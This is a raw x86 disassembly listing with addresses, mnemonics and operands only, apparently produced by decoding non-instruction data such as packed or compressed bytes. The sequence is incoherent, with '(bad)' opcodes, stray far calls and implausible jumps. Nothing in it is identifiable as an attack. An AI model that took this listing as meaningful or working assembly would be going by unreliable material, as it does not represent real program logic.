  403e8b:	or     al,0x81
  403e8d:	add    al,BYTE PTR [edx+eax*1+0x60060030]
  403e94:	add    BYTE PTR [ecx],ah
  403e96:	inc    eax
  403e97:	or     dl,BYTE PTR [eax]
  403e99:	loopne 0x403ee7
  403e9b:	and    al,0xc1
  403e9d:	nop
  403e9e:	add    dl,BYTE PTR [ebx-0x7e]
  403ea1:	rol    BYTE PTR [eax-0x2356dc7a],1
  403ea7:	or     edx,DWORD PTR [eax+0x2c058634]
  403ead:	add    ch,BYTE PTR [eax+0x44]
  403eb0:	add    al,0x50
  403eb2:	dec    ecx
  403eb3:	mov    al,BYTE PTR [eax+eax*4+0x42a21942]
  403eba:	adc    BYTE PTR [eax+0x32082810],ch
  403ec0:	add    al,BYTE PTR cs:[eax-0x3b75f6f8]
  403ec7:	push   es
  403ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ec9:	inc    eax
  403eca:	mov    al,ds:0x32e1040b
  403ecf:	add    eax,0x21100410
  403ed4:	test   DWORD PTR [eax],esp
  403ed6:	or     al,0x42
  403ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed9:	xor    BYTE PTR [esp+0x2a30b800],al
  403ee0:	add    BYTE PTR [eax+0xb],cl
  403ee3:	sbb    DWORD PTR [eax+eiz*1],eax
  403ee6:	adc    al,0x1
  403ee9:	inc    eax
  403eea:	nop
  403eeb:	jo     0x403f0d
  403eed:	inc    ecx
  403eee:	and    al,0x80
  403ef0:	add    eax,DWORD PTR [esp+eax*1-0x7e]
  403ef4:	add    eax,0xb1122100
  403ef9:	and    BYTE PTR [edx+ecx*1+0x15ff3ce8],al
  403f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f01:	jb     0x403f44
  403f03:	add    BYTE PTR [eax+eax*1],cl
  403f06:	add    eax,eax
  403f08:	add    DWORD PTR [edx],0x3008
  403f0e:	or     BYTE PTR [esi+0x17000281],dl
  403f14:	sub    al,0x2d
  403f16:	mov    fs,WORD PTR [eax]
  403f18:	and    BYTE PTR [eax],al
  403f1a:	add    BYTE PTR [eax],cl
  403f1c:	pusha  
  403f1d:	add    DWORD PTR [esi],ecx
  403f1f:	adc    eax,DWORD PTR [eax+edi*2-0x1fbdf4a0]
  403f26:	add    al,0x91
  403f28:	or     DWORD PTR [ebx+0x51489b0a],ebx
  403f2e:	inc    esp
  403f2f:	adc    bl,BYTE PTR [eax+0x12]
  403f32:	add    BYTE PTR [eax],cl
  403f34:	or     BYTE PTR [edx],ah
  403f36:	pusha  
  403f37:	add    al,0x83
  403f39:	ret    
  403f3a:	add    dh,BYTE PTR [edx+0x41]
  403f3d:	dec    edx
  403f3e:	push   es
  403f3f:	push   ecx
  403f40:	sbb    BYTE PTR [eax],al
  403f42:	add    al,BYTE PTR [eax]
  403f44:	inc    esi
  403f45:	mov    BYTE PTR [eax-0x6faf1ff8],cl
  403f4b:	js     0x403fb9
  403f4d:	add    DWORD PTR [esi],ecx
  403f4f:	add    eax,DWORD PTR [ebx]
  403f51:	or     DWORD PTR [esi],eax
  403f53:	add    BYTE PTR [edx+ecx*1+0x5],0x20
  403f58:	or     DWORD PTR ds:0x1120042e,0x104d48
  403f62:	adc    al,BYTE PTR [eax]
  403f64:	or     BYTE PTR [eax-0x7bf57317],bl
  403f6a:	mov    WORD PTR [esp+ecx*2+0x8],es
  403f6e:	add    al,0x78
  403f70:	fcmovb st,st(4)
  403f72:	mov    dh,0x40
  403f74:	adc    DWORD PTR [eax*1-0x3179ffb8],eax
  403f7b:	add    BYTE PTR [eax],al
  403f7d:	dec    ecx
  403f7e:	xchg   DWORD PTR [edx+0x14],ecx
  403f81:	test   al,0xb7
  403f83:	adc    DWORD PTR [eax],0x9608080
  403f89:	add    DWORD PTR [edx],esi
  403f8b:	push   edx
  403f8c:	push   eax
  403f8d:	jo     0x403fb0
  403f8f:	or     al,0x97
  403f91:	add    BYTE PTR [ecx],0x2c
  403f94:	and    BYTE PTR [eax],ah
  403f96:	mov    BYTE PTR [eax],ah
  403f98:	dec    ecx
  403f99:	inc    ebp
  403f9a:	push   es
  403f9b:	add    BYTE PTR [ecx],al
  403f9d:	add    BYTE PTR [edx],0x35
  403fa0:	add    eax,0x92038724
  403fa5:	loop   0x403fc8
  403fa7:	mov    BYTE PTR [edx+eiz*1],ch
  403faa:	add    BYTE PTR [ecx+0x25],0x9
  403fae:	inc    eax
  403faf:	or     BYTE PTR [eax+0x0],al
  403fb2:	jo     0xa66c1c5
  403fb8:	pop    ss
  403fb9:	add    BYTE PTR [eax],0x90
  403fbc:	adc    bl,BYTE PTR [eax+0x22329580]
  403fc2:	sub    eax,0x8a002801
  403fc7:	dec    edi
  403fc8:	add    ah,BYTE PTR [esi]
  403fca:	inc    edx
  403fcb:	add    BYTE PTR [edx],al
  403fcd:	sub    DWORD PTR [eax+eiz*1+0x180aa0],eax
  403fd4:	add    al,0x40
  403fd6:	push   ds
  403fd7:	adc    BYTE PTR [eax+0x6],al
  403fda:	add    BYTE PTR [esi-0x6e],al
  403fdd:	and    dl,BYTE PTR [ecx+0x2]
  403fe0:	add    BYTE PTR [ecx],al
  403fe2:	add    BYTE PTR cs:[eax+0x1],cl
  403fe6:	push   ss
  403fe7:	inc    esi
  403fe8:	dec    ecx
  403fe9:	adc    BYTE PTR [eax],dl
  403feb:	pusha  
  403fec:	add    BYTE PTR [esi-0x7f8ddbf6],cl
  403ff2:	or     BYTE PTR [edx],al
  403ff4:	jp     0x403f8a
  403ff6:	pusha  
  403ff7:	mov    BYTE PTR [eax+0x8],ah
  403ffa:	ret    0x21a5
  403ffd:	adc    BYTE PTR [eax],dl
  403fff:	add    BYTE PTR [ecx],al
  404001:	xor    BYTE PTR [edx-0x70a9bbe0],al
  404007:	inc    eax
  404008:	or     BYTE PTR [eax-0x4fbdedfb],al
  40400e:	add    BYTE PTR [ecx],al
  404010:	xchg   edx,eax
  404011:	add    BYTE PTR [eax-0x7c],al
  404014:	dec    ecx
  404015:	add    eax,0x942ca11
  40401a:	add    dl,0x2
  40401d:	nop
  40401e:	add    al,0xe0
  404020:	add    BYTE PTR [edx],0x40
  404023:	xor    DWORD PTR [eax*2+0x20428b34],edi
  40402a:	add    DWORD PTR fs:[ebx+0x42004341],eax
  404031:	add    BYTE PTR [ecx+0x9028040],al
  404037:	lea    eax,[eax]
  404039:	addr16 inc ecx
  40403b:	and    BYTE PTR [eax+eax*2],al
  40403e:	pusha  
  40403f:	or     BYTE PTR [edi+0x0],al
  404042:	and    BYTE PTR es:[eax],0x6c
  404046:	or     al,BYTE PTR [eax+0x2]
  404049:	push   cs
  40404a:	and    BYTE PTR ds:0x30598816,0x0
  404051:	inc    eax
  404052:	lock dec esp
  404054:	or     dl,BYTE PTR [edi-0x7cbd3ff6]
  40405a:	inc    eax
  40405b:	adc    al,BYTE PTR [eax-0x77]
  40405e:	or     al,dl
  404060:	add    eax,0xc0f4080
  404065:	add    dh,BYTE PTR [edx]
  404067:	data16 adc BYTE PTR [esp+eax*1+0x21],al
  40406c:	inc    esp
  40406d:	add    al,BYTE PTR [ebp-0x7fececd8]
  404073:	or     BYTE PTR [edx+eax*1],ah
  404076:	les    edx,FWORD PTR [eax]
  404078:	or     al,BYTE PTR [eax+ebp*1+0x8002490]
  40407f:	arpl   WORD PTR [eax],ax
  404081:	push   cs
  404082:	add    BYTE PTR [edx+0x10],cl
  404085:	loop   0x404092
  404087:	adc    BYTE PTR [esi],ah
  404089:	add    BYTE PTR ds:0x4428c370,0x63
  404090:	add    BYTE PTR [eax-0x1c],al
  404093:	add    DWORD PTR [edx+eax*1],0xf9d028
  40409a:	jo     0x4040a0
  40409c:	pop    es
  40409d:	or     BYTE PTR [eax],dh
  40409f:	rol    BYTE PTR [ebx+eax*1],1
  4040a2:	and    BYTE PTR [eax+eax*1-0x7b2f78cc],0x81
  4040aa:	and    BYTE PTR [eax+edx*4],al
  4040ad:	sub    DWORD PTR [edx],eax
  4040af:	inc    esp
  4040b0:	and    al,BYTE PTR [eax]
  4040b2:	add    BYTE PTR [eax],cl
  4040b4:	and    al,0x95
  4040b6:	inc    edx
  4040b7:	ret    
  4040b8:	and    al,0x82
  4040ba:	add    al,BYTE PTR [edx]
  4040bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040bd:	add    esp,0x60a035
  4040c3:	adc    BYTE PTR [eax],cl
  4040c5:	add    BYTE PTR [edx],cl
  4040c7:	add    BYTE PTR [ecx+0x44],al
  4040ca:	enter  0x8602,0x7
  4040ce:	mov    dh,BYTE PTR [edx]
  4040d0:	inc    ebp
  4040d1:	fs or  al,0x38
  4040d4:	or     BYTE PTR [edx+ecx*4],cl
  4040d7:	adc    BYTE PTR [edx+0x8080],ah
  4040dd:	xor    al,BYTE PTR [eax]
  4040df:	mov    BYTE PTR [eax-0x7ef3ce00],0x13
  4040e6:	les    eax,FWORD PTR [ebx+0x1]
  4040e9:	add    cl,BYTE PTR [edx]
  4040eb:	inc    eax
  4040ec:	rcr    BYTE PTR [edi],0x82
  4040ef:	mov    esi,DWORD PTR [edx]
  4040f1:	loopne 0x4040f5
  4040f3:	inc    ecx
  4040f4:	adc    esi,DWORD PTR [eax+eax*4]
  4040f7:	jo     0x404105
  4040f9:	rol    BYTE PTR [eax+0x404c3100],1
  4040ff:	mov    al,ds:0x48026023
  404104:	int3   
  404105:	add    ch,BYTE PTR [eax+0x54]
  404108:	push   ss
  404109:	sub    al,BYTE PTR [eax+eax*4]
  40410c:	or     eax,DWORD PTR [eax+edi*1+0x8]
  404110:	xchg   esi,eax
  404111:	inc    edx
  404112:	add    al,BYTE PTR [ecx]
  404114:	and    cl,BYTE PTR [ecx]
  404116:	push   eax
  404117:	add    BYTE PTR [esi],dl
  404119:	les    eax,FWORD PTR [eax]
  40411b:	xor    DWORD PTR [ecx],eax
  40411d:	or     eax,0x92c5562
  404122:	adc    eax,eax
  404124:	and    DWORD PTR [edx-0x27],0x28080010
  40412b:	lahf   
  40412c:	push   esp
  40412d:	add    BYTE PTR [eax],bl
  40412f:	adc    eax,eax
  404131:	loopne 0x4040dc
  404133:	add    BYTE PTR [ecx+0x20],cl
  404136:	and    ah,BYTE PTR [ecx+0x404010c4]
  40413c:	or     al,al
  40413e:	test   BYTE PTR [edx+eax*8],cl
  404141:	ins    BYTE PTR es:[edi],dx
  404142:	or     BYTE PTR [edx],al
  404144:	adc    al,BYTE PTR [eax]
  404146:	push   ecx
  404147:	add    DWORD PTR [eax+0x14],ecx
  40414a:	inc    ecx
  40414b:	add    BYTE PTR [eax+0x381000c],dl
  404151:	add    BYTE PTR [eax+0xc],cl
  404154:	sub    edx,DWORD PTR ds:0x34020000
  40415a:	adc    BYTE PTR [edx+0x10017440],al
  404160:	call   0x7800:0x18450030
  404167:	add    al,BYTE PTR [ecx]
  404169:	sub    al,cl
  40416b:	xor    al,BYTE PTR [ecx+0x8]
  40416e:	add    dl,BYTE PTR [eax]
  404170:	sbb    ecx,edx
  404172:	add    BYTE PTR [eax+0x69892260],cl
  404178:	mov    eax,ds:0x428082c4
  40417d:	add    BYTE PTR [eax],ah
  40417f:	nop
  404180:	and    DWORD PTR [eax+0x0],esp
  404183:	adc    al,0x20
  404185:	add    cl,BYTE PTR [eax+0x4]
  404188:	push   cs
  404189:	add    BYTE PTR es:[eax],al
  40418c:	enter  0x842,0x51
  404190:	inc    esp
  404191:	or     al,0x18
  404193:	add    bl,BYTE PTR [ecx]
  404195:	sub    BYTE PTR [eax],al
  404197:	adc    BYTE PTR [edx+0x6204418],dl
  40419d:	add    cl,BYTE PTR [eax+0x1]
  4041a0:	pop    edx
  4041a1:	aaa    
  4041a2:	and    eax,0x410521f0
  4041a7:	adc    BYTE PTR [esi+eax*1],ah
  4041aa:	inc    eax
  4041ab:	inc    eax
  4041ac:	mov    ds:0x4012381,eax
  4041b1:	or     al,0x64
  4041b3:	and    BYTE PTR [eax-0x77],al
  4041b6:	mov    ds:0x14034421,al
  4041bb:	add    BYTE PTR [eax+eax*1+0xc],al
  4041bf:	inc    eax
  4041c0:	or     al,0x80
  4041c2:	and    BYTE PTR [ecx+0x2420a0a0],dl
  4041c8:	adc    BYTE PTR [eax],al
  4041ca:	add    BYTE PTR [ecx],al
  4041cc:	add    BYTE PTR [eax+0x2111d11],al
  4041d2:	sub    ah,bl
  4041d4:	add    BYTE PTR [eax+0x2],0x8
  4041d8:	add    BYTE PTR [edx+edx*1],0x2
  4041dc:	push   eax
  4041dd:	inc    edx
  4041de:	inc    eax
  4041df:	inc    esp
  4041e0:	mov    bl,0x0
  4041e2:	and    DWORD PTR [eax],ebx
  4041e4:	mov    cl,0x1
  4041e6:	inc    edx
  4041e7:	add    BYTE PTR [ecx+0x54],al
  4041ea:	adc    al,0x0
  4041ec:	xchg   BYTE PTR [eax],al
  4041ee:	mov    eax,ds:0x853401
  4041f3:	add    al,0x89
  4041f5:	adc    al,BYTE PTR [ecx]
  4041f7:	add    BYTE PTR [ecx],ah
  4041f9:	mov    al,ds:0x28858100
  4041fe:	inc    eax
  4041ff:	add    DWORD PTR [eax],eax
  404201:	add    al,0x88
  404203:	mov    al,ds:0x80002082
  404208:	and    BYTE PTR [edx],al
  40420a:	es ret 0x21a2
  40420e:	mov    BYTE PTR [eax+0x10a80491],al
  404214:	sub    BYTE PTR [edx],al
  404216:	add    edx,DWORD PTR [edx+ebx*4]
  404219:	and    DWORD PTR [eax+0x36249021],edi
  40421f:	add    ah,dh
  404221:	adc    al,BYTE PTR [eax]
  404223:	and    al,0x1
  404225:	add    BYTE PTR ds:0x2e402221,0x15
  40422c:	add    BYTE PTR [eax+0x8],0x70
  404230:	add    DWORD PTR [ecx],0x1c661508
  404236:	add    eax,0x80208084
  40423b:	add    BYTE PTR [ecx],cl
  40423d:	add    BYTE PTR [eax+0x1f0a0014],al
  404243:	add    al,0x4b
  404245:	rol    DWORD PTR [eax+0x18683091],0x8
  40424c:	ins    BYTE PTR es:[edi],dx
  40424d:	inc    ecx
  40424e:	add    DWORD PTR [eax+0x2],eax
  404251:	add    al,0x4
  404253:	and    dl,BYTE PTR [ecx]
  404255:	and    BYTE PTR [eax],0x84
  404258:	dec    esi
  404259:	jo     0x40421b
  40425b:	add    BYTE PTR [edx],cl
  40425d:	add    al,0x42
  40425f:	add    BYTE PTR [esi],al
  404261:	mov    al,0x7
  404263:	add    ch,al
  404265:	dec    esi
  404266:	inc    esp
  404267:	add    BYTE PTR [eax+0x50020405],al
  40426d:	sub    BYTE PTR [eax+0x4d08a012],ah
  404273:	inc    edx
  404274:	aam    0x80
  404276:	add    BYTE PTR [edx-0x50],al
  404279:	adc    eax,DWORD PTR [ebx-0x16]
  40427c:	and    DWORD PTR [edx],esp
  40427e:	xchg   edi,eax
  40427f:	inc    edx
  404280:	ror    BYTE PTR [eax+0x2a],0x4
  404284:	or     DWORD PTR [ecx],eax
  404286:	(bad)  
  404287:	or     BYTE PTR [edi+0x12],ch
  40428a:	xor    eax,0xe2803008
  40428f:	mov    ah,0x80
  404291:	push   esp
  404292:	add    BYTE PTR [eax+0x48],al
  404295:	add    eax,DWORD PTR [edx]
  404297:	xchg   BYTE PTR [eax+0x10b8580],cl
  40429d:	sub    BYTE PTR [eax],0x82
  4042a0:	nop
  4042a1:	sub    DWORD PTR [eax+eiz*2],edx
  4042a4:	adc    BYTE PTR [ebx],0x91
  4042a7:	adc    BYTE PTR [eax+0x56a00640],cl
  4042ad:	dec    eax
  4042ae:	add    DWORD PTR [ebx],eax
  4042b0:	or     al,0x81
  4042b2:	add    BYTE PTR [edx-0x3c],al
  4042b5:	inc    ecx
  4042b6:	and    al,0x12
  4042b8:	dec    eax
  4042b9:	add    ch,BYTE PTR [eax+ecx*4]
  4042bc:	add    BYTE PTR [edx],ch
  4042be:	or     dl,BYTE PTR [eax+0x224188a]
  4042c4:	stos   BYTE PTR es:[edi],al
  4042c5:	push   es
  4042c6:	cmp    cl,BYTE PTR [eax]
  4042c8:	and    BYTE PTR [ecx],0x21
  4042cb:	add    eax,0x30020288
  4042d0:	xlat   BYTE PTR ds:[ebx]
  4042d1:	adc    al,dl
  4042d3:	adc    BYTE PTR [eax],ah
  4042d5:	sbb    dh,BYTE PTR [eax]
  4042d7:	sbb    BYTE PTR [eax+eiz*1],ah
  4042da:	inc    ebp
  4042db:	and    dh,BYTE PTR [eax]
  4042dd:	ins    BYTE PTR es:[edi],dx
  4042de:	int    0x2
  4042e0:	add    BYTE PTR [eax+0x1180ca12],cl
  4042e6:	and    bh,BYTE PTR [ebx]
  4042e8:	add    ah,BYTE PTR ds:0x8904066
  4042ee:	adc    BYTE PTR [eax+eax*1],al
  4042f1:	mov    al,ah
  4042f3:	adc    BYTE PTR [eax],al
  4042f5:	or     DWORD PTR [edx],ecx
  4042f7:	adc    al,BYTE PTR [ecx]
  4042f9:	sub    BYTE PTR [ebx],dh
  4042fb:	or     ebx,DWORD PTR [eax+edx*4]
  4042fe:	adc    al,0x1
  404300:	test   eax,0x27a8800
  404305:	xor    al,BYTE PTR [esi]
  404307:	add    DWORD PTR [edi],ecx
  404309:	or     al,BYTE PTR [esi+0x0]
  40430c:	and    al,0xb1
  40430e:	add    eax,DWORD PTR [eax]
  404310:	or     BYTE PTR [edx],dl
  404312:	or     al,0x8
  404314:	adc    BYTE PTR [edx+edx*1],al
  404317:	xchg   edx,eax
  404318:	add    ah,ah
  40431a:	add    eax,DWORD PTR fs:[ebp+0x0]
  40431e:	push   ss
  40431f:	add    al,0x81
  404321:	add    bl,al
  404323:	add    BYTE PTR [eax-0x369fff37],al
  404329:	retf   0x2822
  40432c:	add    eax,0x19226820
  404331:	xor    DWORD PTR [esp+eax*1-0x30],eax
  404335:	shl    BYTE PTR [eax],0x2
  404338:	add    BYTE PTR [eax-0x7ff5b9fa],al
  40433e:	inc    esp
  40433f:	inc    eax
  404340:	sbb    eax,0x5000e342
  404345:	adc    eax,0x82ca3842
  40434a:	sbb    cl,BYTE PTR [eax+0x20]
  40434d:	add    al,BYTE PTR [ecx]
  40434f:	or     edi,DWORD PTR [ecx+edx*1]
  404352:	and    DWORD PTR [eax],eax
  404354:	and    BYTE PTR [eax],al
  404356:	add    al,al
  404358:	ret    0xa810
  40435b:	dec    eax
  40435c:	sub    BYTE PTR [ecx],al
  40435e:	add    eax,0x80188d3
  404363:	push   ss
  404364:	add    BYTE PTR [eax],al
  404366:	or     al,0x42
  404368:	imul   esp,DWORD PTR [eax],0x51830221
  40436e:	add    BYTE PTR [ecx+0x14],al
  404371:	test   DWORD PTR [eax],ecx
  404373:	test   BYTE PTR [eax+0x8],cl
  404376:	and    BYTE PTR [ecx],0x82
  404379:	and    dl,BYTE PTR [edi-0x6778eef8]
  40437f:	pop    eax
  404380:	dec    eax
  404381:	mov    BYTE PTR [eax],cl
  404383:	add    BYTE PTR [esi],ah
  404385:	or     eax,DWORD PTR [edx+0x0]
  404388:	sbb    BYTE PTR [edx+0x24],al
  40438b:	imul   edx,DWORD PTR [eax+0x8340940],0x90b44802
  404395:	nop
  404396:	inc    ebx
  404397:	xor    ch,BYTE PTR [eax]
  404399:	add    edx,DWORD PTR [eax+ebx*1+0x22]
  40439d:	rol    BYTE PTR [ebx+0x1],0x4
  4043a1:	sbb    dl,BYTE PTR [eax+edx*2+0x2d01212]
  4043a8:	das    
  4043a9:	nop
  4043aa:	inc    edx
  4043ab:	add    BYTE PTR [eax+0xa],ah
  4043ae:	rcr    BYTE PTR [esp],0x8
  4043b2:	sbb    BYTE PTR [ecx-0x79],dh
  4043b5:	adc    BYTE PTR [eax],0x0
  4043b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043b9:	and    BYTE PTR [edx],al
  4043bb:	xchg   BYTE PTR [eax],ch
  4043bd:	test   BYTE PTR [ebp+0x18c0020],al
  4043c3:	adc    al,0x38
  4043c5:	dec    eax
  4043c6:	sbb    esp,DWORD PTR [eax-0x68]
  4043c9:	nop
  4043ca:	and    eax,DWORD PTR [eax]
  4043cc:	add    DWORD PTR [eax+0x1],edx
  4043cf:	sbb    BYTE PTR [eax],ah
  4043d1:	adc    BYTE PTR [ebp+0x22],0x30
  4043d5:	jbe    0x4043d9
  4043d7:	inc    ecx
  4043d8:	and    BYTE PTR [eax+0x2884141],al
  4043de:	push   cs
  4043df:	inc    ecx
  4043e0:	dec    esi
  4043e1:	add    DWORD PTR [esi+eax*1],eax
  4043e4:	dec    eax
  4043e5:	add    al,0x11
  4043e7:	sub    ah,BYTE PTR [edx]
  4043e9:	repz add DWORD PTR [eax],eax
  4043ec:	add    al,0x74
  4043ee:	mov    BYTE PTR [edx],cl
  4043f0:	and    BYTE PTR [ebx],0x3
  4043f3:	push   0xc200235
  4043f8:	in     eax,0x8
  4043fa:	push   es
  4043fb:	add    BYTE PTR [edx-0x7fa5dd4e],cl
  404401:	add    eax,DWORD PTR [eax]
  404403:	adc    BYTE PTR [ecx],al
  404405:	add    eax,0x18002
  40440a:	mov    DWORD PTR [esi+eax*1+0x14],ecx
  40440e:	dec    ebp
  40440f:	and    DWORD PTR [eax-0x36],eax
  404412:	adc    cl,BYTE PTR [ecx]
  404414:	sub    BYTE PTR [eax+esi*1],cl
  404417:	add    al,BYTE PTR [eax]
  404419:	add    DWORD PTR [esi+eiz*2],0x13883200
  404420:	xchg   esp,eax
  404421:	test   al,0x80
  404423:	pusha  
  404424:	add    eax,0xc30a05c0
  404429:	inc    edx
  40442a:	xchg   ecx,eax
  40442b:	add    BYTE PTR [edx],al
  40442d:	nop
  40442e:	xchg   BYTE PTR [eax],al
  404430:	inc    ecx
  404431:	push   es
  404432:	mov    al,ds:0xa2c204
  404437:	add    BYTE PTR [eax],al
  404439:	dec    edx
  40443a:	and    al,0x96
  40443c:	add    DWORD PTR [eax+0x6],eax
  40443f:	or     BYTE PTR [eax+0x10],dl
  404442:	or     al,BYTE PTR [eax]
  404444:	add    al,BYTE PTR [ecx]
  404446:	adc    eax,0x7820812
  40444b:	adc    eax,0x88182850
  404450:	adc    al,BYTE PTR [edx+0x42]
  404453:	int3   
  404454:	add    BYTE PTR [edi+0x40082022],al
  40445a:	add    BYTE PTR [eax],ah
  40445c:	loopne 0x404460
  40445e:	lea    edx,[eax+eiz*4]
  404461:	add    cl,BYTE PTR [ebx]
  404463:	and    al,0x9
  404465:	cwde   
  404466:	inc    esp
  404467:	mov    ds:0xa280,al
  40446c:	jo     0x4043f6
  40446e:	add    BYTE PTR [eax],cl
  404470:	cmp    BYTE PTR [ecx],al
  404472:	add    al,0x2e
  404474:	cmp    eax,0xe50d0100
  404479:	and    BYTE PTR [ecx+eax*8-0x40],ah
  40447d:	xor    al,BYTE PTR [eax-0x70]
  404480:	add    al,0x2
  404482:	add    DWORD PTR [eax+0x12],0xffffff85
  404486:	add    al,0x0
  404488:	pop    esi
  404489:	les    esp,FWORD PTR [eax+edi*1+0x400e0898]
  404490:	add    BYTE PTR [esi],dl
  404492:	pusha  
  404493:	and    BYTE PTR [edx+0xa000058],al
  404499:	rol    BYTE PTR ds:0x1990640,0x60
  4044a0:	cwde   
  4044a1:	push   ebp
  4044a2:	or     eax,0x903c204
  4044a7:	inc    ebp
  4044a8:	adc    dl,BYTE PTR [edx]
  4044aa:	inc    eax
  4044ab:	sbb    BYTE PTR [ebp+0x19a18e80],al
  4044b1:	shl    BYTE PTR [eax],0x10
  4044b4:	add    al,0x48
  4044b6:	inc    eax
  4044b7:	pop    eax
  4044b8:	adc    DWORD PTR [eax],ebp
  4044ba:	xor    ah,BYTE PTR [edx+eax*1+0x30013a02]
  4044c1:	push   esp
  4044c2:	add    al,0x0
  4044c4:	mov    ds:0x84001248,eax
  4044c9:	add    BYTE PTR [eax],bl
  4044cb:	sub    BYTE PTR [eax-0x7a],0xa8
  4044cf:	mov    al,0x85
  4044d1:	add    BYTE PTR [eax+0x12],cl
  4044d4:	gs push 0x1010382
  4044da:	sub    BYTE PTR [eax],bl
  4044dc:	dec    ebx
  4044dd:	or     BYTE PTR [ebx],0x10
  4044e0:	xchg   esi,eax
  4044e1:	ror    DWORD PTR [eax-0x7f],1
  4044e4:	lods   al,BYTE PTR ds:[esi]
  4044e5:	rol    BYTE PTR [ecx+eiz*1],0x40
  4044e9:	add    bl,BYTE PTR [ecx+0x80040c0]
  4044ef:	and    al,dl
  4044f1:	rol    BYTE PTR ds:0xb828e194,0x99
  4044f8:	and    ecx,DWORD PTR [eax]
  4044fa:	aam    0x22
  4044fc:	adc    al,0x89
  4044fe:	or     eax,DWORD PTR [eax]
  404500:	add    BYTE PTR [eax],0xa0
  404503:	add    eax,0x12120010
  404508:	dec    edx
  404509:	xchg   ebx,eax
  40450a:	add    DWORD PTR [ecx],0x2
  40450d:	adc    al,ch
  40450f:	loop   0x404529
  404511:	mov    cl,BYTE PTR [eax+edx*2+0x10210811]
  404518:	or     eax,eax
  40451a:	add    BYTE PTR [eax+0x102224a1],al
  404520:	or     BYTE PTR [edx],dl
  404522:	add    al,0x19
  404524:	add    al,0x3
  404526:	or     BYTE PTR [eax],ah
  404528:	or     BYTE PTR [ecx],cl
  40452a:	mov    BYTE PTR [eax+0xe],al
  40452d:	add    DWORD PTR [edx+eax*4-0x80],esi
  404531:	or     BYTE PTR [eax],al
  404533:	add    ah,BYTE PTR [ecx+0x2ca842]
  404539:	or     al,0x0
  40453b:	or     BYTE PTR [edx+eax*4+0x44],al
  40453f:	and    BYTE PTR [ecx],ah
  404541:	test   al,0x9
  404543:	inc    eax
  404544:	stos   BYTE PTR es:[edi],al
  404545:	mov    al,ds:0x49a8481a
  40454a:	add    cl,BYTE PTR [ecx]
  40454c:	adc    BYTE PTR [eax+ecx*1+0x10038c80],al
  404553:	and    eax,eax
  404555:	add    al,0xc
  404557:	or     al,BYTE PTR [esi]
  404559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40455a:	add    BYTE PTR [esi+0x19],dl
  40455d:	add    dl,al
  40455f:	and    BYTE PTR [eax],dl
  404561:	mov    BYTE PTR [esp+ecx*4],al
  404564:	loopne 0x404566
  404566:	or     BYTE PTR [ebx],al
  404568:	sbb    al,0xe2
  40456a:	inc    eax
  40456b:	inc    ebx
  40456c:	xchg   ebx,eax
  40456d:	add    dl,cl
  40456f:	and    BYTE PTR [edx],al
  404571:	nop
  404572:	stos   BYTE PTR es:[edi],al
  404573:	add    BYTE PTR [eax],al
  404575:	or     BYTE PTR [eax+0xa],cl
  404578:	sldt   WORD PTR [eax]
  40457b:	add    BYTE PTR [esi],ch
  40457d:	lods   al,BYTE PTR ds:[esi]
  40457e:	inc    eax
  40457f:	jecxz  0x404501
  404581:	les    ecx,FWORD PTR [edx]
  404583:	bound  eax,QWORD PTR [eax]
  404585:	inc    eax
  404586:	rol    BYTE PTR [eax+ebx*1],0xb7
  40458a:	add    BYTE PTR [eax],al
  40458c:	push   es
  40458d:	mov    BYTE PTR [edx+0x1],0x40
  404591:	mov    al,BYTE PTR [eax]
  404593:	add    al,BYTE PTR [eax+ecx*1]
  404596:	dec    ecx
  404597:	add    al,0x28
  404599:	or     BYTE PTR [esp+esi*1],al
  40459c:	xor    BYTE PTR [eax+eax*2+0xa],0x1
  4045a1:	rcl    BYTE PTR [eax],1
  4045a3:	add    edx,DWORD PTR [ecx+0x2]
  4045a6:	adc    eax,0x7b008000
  4045ab:	mov    BYTE PTR [ebx+0x28084f40],al
  4045b1:	test   al,0x4
  4045b3:	or     ebx,ecx
  4045b5:	and    al,0x4c
  4045b7:	sbb    eax,0x60711001
  4045bc:	inc    eax
  4045bd:	add    BYTE PTR [eax],0x20
  4045c0:	adc    BYTE PTR [eax+0x801830b],ah
  4045c6:	adc    BYTE PTR [eax],ah
  4045c8:	add    al,0x22
  4045ca:	add    dh,BYTE PTR [esi]
  4045cc:	add    DWORD PTR [edx+0x4010c04c],0x90c0040
  4045d6:	pusha  
  4045d7:	inc    eax
  4045d8:	add    al,0x69
  4045da:	pop    eax
  4045db:	and    BYTE PTR [esi+edx*2],dl
  4045de:	add    BYTE PTR [eax-0x33cf7af0],dh
  4045e4:	adc    al,BYTE PTR [eax]
  4045e6:	mov    BYTE PTR [edx],al
  4045e8:	or     BYTE PTR [edx+0x10],ah
  4045eb:	or     al,0x14
  4045ed:	and    BYTE PTR [eax+0x1200208],0x25
  4045f4:	int    0x4
  4045f6:	cdq    
  4045f7:	add    al,BYTE PTR [eax+eax*1]
  4045fa:	or     BYTE PTR [eax+eax*4+0x3050442],bl
  404601:	add    cl,BYTE PTR [ebx]
  404603:	and    BYTE PTR [eax],ch
  404605:	push   cs
  404606:	loope  0x404619
  404608:	add    BYTE PTR [ecx+0x1068c280],0x80
  40460f:	inc    eax
  404610:	adc    DWORD PTR [edx],eax
  404612:	add    BYTE PTR [eax+eiz*1],dl
  404615:	cmp    al,0x20
  404617:	mov    BYTE PTR [eax],al
  404619:	dec    eax
  40461a:	mov    al,0x50
  40461c:	and    BYTE PTR [eax],0x0
  40461f:	or     BYTE PTR [ebx],dl
  404621:	bound  eax,QWORD PTR [edx]
  404623:	add    BYTE PTR [edi],0x88
  404626:	sub    BYTE PTR [eax+ecx*1+0x50],dl
  40462a:	ins    BYTE PTR es:[edi],dx
  40462b:	push   es
  40462c:	add    BYTE PTR [edi],ch
  40462e:	add    BYTE PTR [ebx-0x2ef37be6],bh
  404634:	adc    BYTE PTR [edx],al
  404636:	or     edx,DWORD PTR [edx]
  404638:	rcl    BYTE PTR [ebx],1
  40463a:	adc    BYTE PTR [eax+0x2],dl
  40463d:	xchg   ecx,eax
  40463e:	inc    eax
  40463f:	jne    0x404693
  404641:	xor    DWORD PTR [ebx],eax
  404643:	cwde   
  404644:	add    BYTE PTR [eax+ecx*1],dl
